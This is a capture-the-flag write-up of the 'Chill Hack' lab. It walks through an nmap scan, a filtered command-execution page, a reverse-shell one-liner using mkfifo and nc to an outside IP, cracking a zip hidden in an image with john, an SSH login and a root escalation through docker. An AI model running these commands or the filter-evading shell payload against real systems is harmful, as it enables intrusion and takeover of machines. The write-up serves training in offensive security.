---
title: CHILL HACK
description: CHILL HACK
---

Difficulty: Easy

![image.png](../../../assets/CHILLHACK/image.png)

I am ready to dive into the another playground? Because this is one adventure you won't regret embarking on! Getting ready to push my limits and experience the thrill of conquering CHILL HACK. Trust me, every moment spent here will be worth it! 🔥🔥🔥

**Information Gathering Phase**

**Nmap**

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap  -sV -vv -sC 10.10.213.240
PORT      STATE    SERVICE     REASON      VERSION
21/tcp    open     ftp         syn-ack     vsftpd 3.0.3
22/tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http        syn-ack     Apache httpd 2.4.29 ((Ubuntu))
62078/tcp filtered iphone-sync no-response
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Found 3 ports open. Lets try to see ftp first 

![image.png](../../../assets/CHILLHACK/image%201.png)

Downloaded the note.txt file.

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ cat note.txt
Anurodh told me that there is some filtering on strings being put in the 
command -- Apaar
```

It might be hint. But remember the user huh. “Anurodh” and “Apaar”.

**Web Page**

![image.png](../../../assets/CHILLHACK/image%202.png)

Scanning web directories

![image.png](../../../assets/CHILLHACK/image%203.png)

lets visit /secret page

![image.png](../../../assets/CHILLHACK/image%204.png)

ohh a page where we can execute command. lets check running some command.

![image.png](../../../assets/CHILLHACK/image%205.png)

when I run the “whoami” command. this is the result. its www-data. 

![image.png](../../../assets/CHILLHACK/image%206.png)

```cpp
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.239 4444 
>/tmp/f
```

So I run this command to get a reverse shell. 

![image.png](../../../assets/CHILLHACK/image%207.png)

Got the the reverse shell. Now lets sneak around.

```cpp
www-data@ubuntu:/var/www/html/secret$ ls 
ls
images  index.php
```

This information couldn’t help me. Lets sneak around 

![image.png](../../../assets/CHILLHACK/image%208.png)

As I was sneaking around I found this directory. hope that it provides useful information

![image.png](../../../assets/CHILLHACK/image%209.png)

![image.png](../../../assets/CHILLHACK/image%2010.png)

I download the pictures from images directory.

![image.png](../../../assets/CHILLHACK/image%2011.png)

![image.png](../../../assets/CHILLHACK/image%2012.png)

 Found out that those pictures contain some useful information

```cpp
                                                       
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ ls
002d7e638fb463fb7a266f5ffc7ac47d.gif
hacker-with-laptop_23-2147985341.jpg
hacker-with-laptop_23-2147985341.jpg.out
                                                                  
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ ls -l 
total 2108
-rw-r--r-- 1 kali kali 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif                                                    
-rw-r--r-- 1 kali kali   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg                                                    
-rw-r--r-- 1 kali kali     750 Oct  8 07:28 hacker-with-laptop_23-2147985341.jpg.out
                                                                  
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ ls -l
total 2108
-rw-r--r-- 1 kali kali 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 kali kali   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
-rw-r--r-- 1 kali kali     750 Oct  8 07:28 hacker-with-laptop_23-2147985341.jpg.out
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ ls -la
total 2116
drwxr-xr-x  2 kali kali    4096 Oct  8 07:28 .
drwxr-xr-x 10 kali kali    4096 Oct  8 07:25 ..
-rw-r--r--  1 kali kali 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r--  1 kali kali   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
-rw-r--r--  1 kali kali     750 Oct  8 07:28 hacker-with-laptop_23-2147985341.jpg.out
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ mv hacker-with-laptop_23-2147985341.jpg.out backup.zip
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ ls    
002d7e638fb463fb7a266f5ffc7ac47d.gif  backup.zip  hacker-with-laptop_23-2147985341.jpg
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$  unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
password incorrect--reenter:                                                                                                
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ zip2john backup.zip  > hash 
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ ls
002d7e638fb463fb7a266f5ffc7ac47d.gif  backup.zip  hacker-with-laptop_23-2147985341.jpg  hash
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ cat hsash 
cat: hsash: No such file or directory
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ cat hash  
backup.zip/source_code.php:$pkzip$1*1*2*0*22a*4bb*69dc82f3*0*49*8*22a*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip$:source_code.php:backup.zip::backup.zip
                                                                                               
┌──(kali㉿kali)-[~/Downloads/chill]
└─$ john hash  --wordlist=~/Downloads/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2024-10-08 07:39) 33.33g/s 409600p/s 409600c/s 409600C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After extracting all the files we found out that it contain source code. when we view it it compares hash which could be password. 

![image.png](../../../assets/CHILLHACK/image%2013.png)

![image.png](../../../assets/CHILLHACK/image%2014.png)

cracked the hash 

at first we found port 22 open 

lets try with it. and we found some username as well. lets try with anurodh.

![image.png](../../../assets/CHILLHACK/image%2015.png)

wow we got it. didn’t know what to do. So decided to scan with linpeas.

![image.png](../../../assets/CHILLHACK/image%2016.png)

Found out that group user is running docker.

![image.png](../../../assets/CHILLHACK/image%2017.png)

We can see that docker is running.

![image.png](../../../assets/CHILLHACK/image%2018.png)

![image.png](../../../assets/CHILLHACK/image%2019.png)

I find out that docker runner can run above command to spawn root shell.

![image.png](../../../assets/CHILLHACK/image%2020.png)

wow got the root shell. Now I can do anything.

![image.png](../../../assets/CHILLHACK/image%2021.png)

got user flag.

![image.png](../../../assets/CHILLHACK/image%2022.png)

Finally!!!

**Final Thought**

This room was so much fun. In this room I realize that running linpeas could do so much of work. Means it makes our work easy. Now I believe that whenever we are stuck we should remember linpeas .😁😄😁 So I would like to recommend this room to a person who wanna learn about linpeas or use linpeas or try linpeas.
